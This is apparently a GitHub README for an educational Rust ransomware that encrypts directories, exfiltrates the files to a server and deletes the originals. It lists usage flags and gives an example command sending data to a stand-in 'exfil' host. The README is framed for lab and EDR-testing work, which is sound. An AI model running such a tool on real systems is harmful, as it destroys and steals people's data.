# Cordyceps

<img src="https://github.com/lopes/cordyceps/raw/main/assets/cordyceps-logo-192.png" align="left" alt="Cordyceps logo">

**Cordyceps** is an educational, Rust-based command-line **ransomware** ☣️ designed for academic and research purposes. It demonstrates the core mechanisms of file encryption, exfiltration, and decryption using modern cryptographic practices.

> [!CAUTION]
> This project is intended **strictly for educational use** in information security courses, penetration testing labs, or research environments. Unauthorized use of this tool—especially outside of controlled, lawful contexts—may be illegal and unethical. The author disclaim any responsibility for misuse or harm resulting from this software.


## What is Cordyceps?
Cordyceps simulates the behavior of a typical ransomware: it encrypts files on a target machine, exfiltrates them to a remote server, and allows for their recovery via decryption—assuming possession of the correct private key material. It is designed for educational use in understanding ransomware internals and for testing endpoint detection and response (EDR) tools in controlled, ethical environments.


## Purpose
Cordyceps was developed as a hands-on learning project to build practical skills in Rust—specifically around command-line interface design, networking, and data serialization—while experimenting with hybrid cryptographic schemes like ECIES (Elliptic Curve Integrated Encryption Scheme), and implementing public-key-based key management. Additionally, it serves as a tool for analyzing ransomware behavior and testing the detection capabilities of endpoint security solutions like EDRs in controlled environments.

It provides a practical platform for studying:
- **Ransomware Behavior Simulation**: Demonstrates the core logic of ransomware operations, from payload execution to encryption and optional file removal.
- **Key Management and Hybrid Cryptography**: Uses AES-256-GCM for content encryption and ECIES (based on Ed25519) for secure key exchange with Perfect Forward Secrecy.
- **Data Exfiltration**: Recursively encrypts files from a specified directory and securely transmits them to a remote server over HTTP/HTTPS.
- **Data Recovery**: Decrypts `.zombie` files back to their original form using the appropriate private key.
- **Security Tool Evaluation**: Enables testing of EDRs and behavioral detection systems by providing realistic ransomware-like behavior in a safe, reproducible manner.

> [!CAUTION]
> Cordyceps is not intended for use against real-world systems without explicit legal authorization. It is designed for educational and research purposes only, within ethical and controlled settings.


## Key Features
- 🔄 **Dual Operation Modes**: Supports both `encrypt` and `decrypt` commands for flexible operation.
- 🔒 **Strong Cryptography**: Uses **AES-256-GCM** for file encryption and **ECIES (Ed25519)** for secure key exchange with Perfect Forward Secrecy.
- 🧟 **`.zombie` Format**: Each encrypted file is stored in a custom `.zombie` format containing:
  - Metadata
  - Ephemeral public key
  - Encrypted symmetric key
  - Nonces
  - Ciphertext
- 📁 **Recursive File Handling**: Automatically walks through directories, encrypts eligible files, and optionally deletes the original plaintext versions.
- 🌐 **Secure Network Exfiltration**: Transmits encrypted data over **HTTP** or **HTTPS** with support for target path specification and basic error handling.


## Ethical Use Notice
This project is a **technical demonstration**, not a weapon. Do not use Cordyceps outside of environments where you have full authorization and consent (e.g., your own machine, a test lab, or a sandbox). Misuse can carry severe legal consequences and violate ethical standards in cybersecurity. ☣️


## Installation
```
# TODO: Provide installation instructions (e.g., cargo install, build from source)
# Example:
# git clone https://github.com/your-username/cordyceps.git
# cd cordyceps
# cargo build --release
# cp target/release/cordyceps /usr/local/bin/
```


## Usage
Cordyceps operates via command-line arguments, allowing flexible control over its behavior.

### Command Line Options
Cordyceps uses subcommands to handle different modes of operation. To use the tool, you must specify either the `encrypt` or `decrypt` command, each with its own set of options. If in doubt, run `cordyceps help`.

#### `encrypt` Command
Use the `encrypt` command to begin the encryption and exfiltration process.

- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
- `-k, --key <PATH>`: File path to the master public key. Default: `master-public.key`.
- `-n, --no-delete`: Prevents the original file from being deleted after successful encryption and transmission. Default: `false`, the original file is deleted.
- `-s, --server <ADDRESS>`: The URL of the server to send encrypted files to (e.g., `https://your.exfil.server:8443`). Default: `http://localhost:8080`.
- `-t, --target-folder <FOLDER_NAME>`: Designates a specific subfolder on the remote server for uploaded files (e.g., `my_laptop_data`). Default: empty, files are uploaded to the root of the specified server endpoint.

#### `decrypt` Command
Use the `decrypt` command to restore `.zombie` files using the provided private key.

- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
- `-k, --key <PATH>`: File path to the master private key. Default: `master-private.key`.
- `-n, --no-delete`: Prevents the `.zombie` file from being deleted after successful decryption. Default: `false`, the `.zombie` file is deleted.

### Examples
#### Encryption Example
This command will encrypt files in the `/path/to/sensitive_data` directory, send them to the specified server and folder, but will not delete the original files.

```sh
cordyceps encrypt -p /path/to/sensitive_data -k /path/to/master-private.key -s https://your.exfil.server:8443 -t my_laptop_data -n
```

#### Decryption Example
This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/master-private.key`.

```sh
cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/master-private.key
```


## Key Management
- **Master Public Key**: For **encryption** operations, the master Ed25519 public key must be provided via the `--key` CLI option. This key is used to establish the shared secret for encrypting the AES key.
- **Master Private Key**: For **decryption** operations, the corresponding Ed25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**

Cordyceps is shipped with the `generate` command that creates a new keypair for this purpose.


## Contributing
Contributions to Cordyceps are welcome! If you're interested in improving the project, here’s how to get started:

1. **Open an Issue**: Before diving into code, please [open an issue](https://github.com/lopes/cordyceps/issues) to discuss any bugs you’ve found or features you'd like to propose. This helps ensure alignment with the project’s goals and prevents duplicated work.
2. **Code Style**: Make sure your code adheres to Rust formatting standards (use `rustfmt`) and follows idiomatic Rust practices before submitting.
3. **Project Scope**: Cordyceps is a tool for file encryption, exfiltration, and decryption. Please keep contributions within this core focus—features outside this scope may be declined.
4. **Pull Requests**: Once your changes are ready, submit a [pull request](https://github.com/lopes/cordyceps/pulls) that includes:
  - A clear description of the changes
  - References to related issue(s)
  - Tests covering new functionality or bug fixes


## License
This project is licensed under the [MIT License](LICENSE).
